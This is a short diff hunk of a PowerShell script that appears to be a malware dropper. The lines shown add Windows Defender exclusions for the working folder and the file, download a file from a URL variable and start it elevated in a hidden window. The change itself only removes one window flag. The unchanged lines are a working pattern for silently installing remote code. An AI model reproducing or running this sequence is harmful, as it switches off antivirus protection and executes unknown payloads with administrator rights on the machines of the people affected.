@@ -4,4 +4,4 @@ $FullPath = "$PWD\$FilePath"
 Add-MpPreference -ExclusionPath $PWD
 Add-MpPreference -ExclusionProcess $FilePath
 Invoke-RestMethod -Uri $DownloadUrl -OutFile $FilePath
-Start-Process -FilePath $FilePath -Verb RunAs -WindowStyle Hidden -CreateNoWindow
+Start-Process -FilePath $FilePath -Verb RunAs -WindowStyle Hidden
